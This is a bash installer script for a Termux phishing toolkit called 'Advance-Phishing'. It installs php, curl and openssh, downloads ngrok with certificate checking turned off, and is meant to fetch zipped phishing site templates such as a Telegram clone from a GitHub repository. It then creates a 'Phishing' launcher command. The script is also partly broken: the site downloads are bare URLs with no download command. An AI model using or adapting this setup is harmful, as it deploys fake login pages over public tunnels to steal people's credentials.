ngrok-ch () {
	cd $PREFIX/bin
	if [ -e ngrok ];then
	chmod 700 ngrok
	else
	random
	printf "\n Downloading ngrok..\n"
	rm -f ngrok* > /dev/null 2>&1
	wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
	unzip ngrok*
	chmod 700 ngrok
	fi
	}
	rn() {
	cd $PREFIX/bin
	if [ -e random ];then
	echo
	else
	cd ~/Advance-Phishing
	cd files
	bash random.sh
	fi
	}
	sites () {
		cd ~/Advance-Phishing
		cd sites
		if [ -e telegram ];then
		echo
		else
		rm -f *zip > /dev/null 2>&1
		https://github.com/rooted-cyber/good/raw/master/sites/sites1.zip 
		https://github.com/rooted-cyber/good/raw/master/sites/sites2.zip 
		https://github.com/rooted-cyber/good/raw/master/sites/sites3.zip 
		https://github.com/rooted-cyber/good/raw/master/sites/sites4.zip
		unzip sites1.zip
		unzip sites2.zip
		unzip sites3.zip
		unzip sites4.zip
		rm -f *zip
		fi
		}
	set() {
	printf "\n \033[1;92m Installing requirement\n"
	apt --fix-broken install
	apt update
	apt upgrade
	apt install php
	apt install wget
	apt install curl
	apt install openssh
	sites
	rn
	ngrok-ch
	echo "#!/data/data/com.termux/files/usr/bin/sh" >> Phishing
	echo "cd ~/Advance-Phishing;bash phishing.sh" >> Phishing
	chmod 777 Phishing
	random
	printf "\n You can use this command : Phishing\n"
	exit
	}
	set